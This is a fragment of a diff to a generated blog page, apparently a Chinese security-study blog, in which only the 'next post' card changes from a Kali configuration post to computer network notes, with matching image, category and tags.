                     </a>
                     
                 </div>
@@ -1021,13 +913,13 @@ php? id<span class="token operator">=</span><span class="token number">1</span> 
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/09/30/kali%E9%85%8D%E7%BD%AE/">
+                <a href="/2021/09/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%94%E8%AE%B0/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="kali配置">
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="计算机网络笔记">
                         
-                        <span class="card-title">kali配置</span>
+                        <span class="card-title">计算机网络笔记</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1044,8 +936,8 @@ php? id<span class="token operator">=</span><span class="token number">1</span> 
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Web%E5%AE%89%E5%85%A8/" class="post-category">
-                                    Web安全
+                            <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/" class="post-category">
+                                    计算机基础
                                 </a>
                             
                             
@@ -1055,12 +947,8 @@ php? id<span class="token operator">=</span><span class="token number">1</span> 
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/kali/">
-                        <span class="chip bg-color">kali</span>
-                    </a>
-                    
-                    <a href="/tags/%E9%85%8D%E7%BD%AE/">
-                        <span class="chip bg-color">配置</span>
+                    <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">
+                        <span class="chip bg-color">计算机网络</span>
                     </a>
                     
                 </div>
